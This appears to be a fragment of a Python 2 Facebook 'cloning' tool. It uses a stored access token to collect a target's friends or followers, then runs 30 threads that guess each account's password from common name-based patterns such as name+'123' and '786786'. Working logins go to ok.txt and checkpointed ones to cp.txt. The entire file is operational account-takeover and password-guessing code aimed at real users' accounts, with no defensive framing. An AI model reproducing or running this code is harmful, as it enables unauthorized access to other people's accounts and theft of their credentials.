
def l_menu():
    global token
    os.system('clear')
    logo()
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        print ''
        print '\t    ' + c + 'ID has checkpoint' + c2
        print ''
        os.system('rm -rf .fb_token.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        logo()
        print ''
        print '\t    \x1b[1;31mTurn on mobile data OR wifi\x1b[0;97m'
        print ''
        time.sleep(1)
        raw_input(' Press enter to try again ')
        b_menu()

    os.system('clear')
    logo()
    print ''
    print 47 * '-'
    print ''
    print '\t  ' + c + 'Logged In User' + ok + c2
    print ''
    print 47 * '-'
    print ''
    print '[1] Cloning from public id'
    print '[2] Cloning from followers'
    print '[3] Return method menu'
    print '[4] Logout'
    print ''
    l_menu_select()


def l_menu_select():
    select = raw_input('\nChoose Option >>> ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\t    Public ID Cloning " | lolcat')
        print ''
        idt = raw_input(' Put Id/user :  ')
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\t    Gathering Information " | lolcat')
        print ''
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            logo()
            print ''
            os.system('echo -e "\t    Public ID Cloning " | lolcat')
            print ''
            print ' Target user : ' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t    \x1b[1;31m Logged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input('\nPress enter to back ')
            l_menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\t    Public ID Cloning " | lolcat')
        print ''
        idt = raw_input(' Put Id/user : ')
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\t    Gathering Information " | lolcat')
        print ''
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            logo()
            print ''
            os.system('echo -e "\t    Followers Cloning " | lolcat')
            print ''
            print ' Target user : ' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t    \x1b[1;31m Logged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input('\n Press enter to back ')
            l_menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
        method_menu()
    elif select == '4':
        logout()
    else:
        print ''
        print '\t    ' + c + 'Select valid method' + c2
        print ''
        l_menu_select()
    print ' Total IDs : ' + str(len(id))
    time.sleep(0.5)
    print ' The process is running in background'
    print ''
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;32m[Successful] \x1b[1;30m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[Checkpoint] ' + uid + ' | ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;32m[Successful] \x1b[1;30m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[Checkpoint] ' + uid + ' | ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name + '12345'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;32m[Successful] \x1b[1;30m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[Checkpoint] ' + uid + ' | ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name + '786'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;32m[Successful] \x1b[1;30m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[Checkpoint] ' + uid + ' | ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '786786'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;32m[Successful] \x1b[1;30m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '[Checkpoint] ' + uid + ' | ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = '786000'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;32m[Successful] \x1b[1;30m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '[Checkpoint] ' + uid + ' | ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = 'Pakistan'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;32m[Successful] \x1b[1;30m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '[Checkpoint] ' + uid + ' | ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp :' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press entet to back ')
    l_menu()


if __name__ == '__main__':
    method_menu()
